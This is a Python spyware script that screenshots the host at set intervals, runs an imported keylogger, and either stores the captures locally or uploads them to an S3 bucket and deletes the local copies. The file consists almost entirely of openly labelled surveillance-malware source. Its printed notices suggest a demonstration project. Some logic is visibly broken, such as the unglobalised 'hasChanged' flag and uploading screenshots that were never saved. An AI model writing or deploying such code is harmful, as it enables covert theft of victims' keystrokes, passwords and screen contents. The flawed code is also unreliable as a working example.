import sys
import argparse
import pyscreenshot as screenshot
import os
from datetime import timedelta, date, datetime
import utils
import time
from threading import Thread
from keylogger import KeyLogger, edit_lock, hasChanged

def ten_seconds_passed(output_dir, s3_bucket):
    while True:
        time.sleep(10)
        edit_lock.acquire()
        if not hasChanged:
            cur_date = datetime.now()
            file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.log'
            fp = output_dir + '/outputs/keylogs' + '/' + file_name
            os.rename(os.getcwd()+'\\output.txt', fp)
            #save payloads to s3
            if s3_bucket != "":
                utils.save_to_s3(fp, file_name)
                os.remove(os.getcwd()+'\\output.txt')
                os.remove(fp)
            hasChanged = True
        edit_lock.release()           

def main(args):
	# Describes what is happening
    print("This spyware is takes a screeshot of the computer it is running on every 10 seconds.")
    print("There is also a keylogging feature keeping track of each key pressed.")
    print("It is probably taking screenshots of your screen right now as you are reading this. :)")
    duration = args.duration
    interval = args.interval
    output_dir = args.output_dir
    s3_bucket = args.s3_bucket

    if not os.path.isdir(output_dir):
        print('Output directory is not a directory.')
        return

    cur_date = datetime.now()
    end_date = timedelta(days=duration) + cur_date
    delta = timedelta(seconds=interval)

    os.mkdir(output_dir+'/outputs')
    os.mkdir(output_dir + '/outputs/screenshots')
    os.mkdir(output_dir + '/outputs/keylogs')
    kwargs = {
        'output_dir': output_dir,
        's3_bucket': s3_bucket
    }
    upload_thread = Thread(target=ten_seconds_passed, kwargs=kwargs)
    upload_thread.start()
    keylogger = KeyLogger()
    while cur_date <= end_date:
        im = screenshot.grab()
        file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.png'
        fp = output_dir + '/outputs/screenshots' + '/' + file_name
        #save payloads to s3
        if s3_bucket != "":
            utils.save_to_s3(fp, file_name)
            os.remove(fp)
        else: #save all payloads (keylogger, history, output files) to output dir
            im.save(fp)

        time.sleep(int(interval))

        cur_date += delta
    upload_thread.join()

# Instruction panel
def inspanel():
    print("Enter 1 to run the program")
    print("Enter 2 to exit")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                                    description = "Screenshots and keylogs a host",
                                )
    parser.add_argument("-d", "--duration", type=int, default=7,
                      help = "The duration of the script in days")
    parser.add_argument("-i", "--interval", type=int, default=10,
                      help = "The interval of the screenshots in seconds")
    parser.add_argument("-o", "--output_dir", default=os.getcwd(),
                      help = "The output directory of the screenshots")
    parser.add_argument("-s3", "--s3_bucket", default="",
                      help = "The output directory of the screenshots")

    args = parser.parse_args()
    main(args)
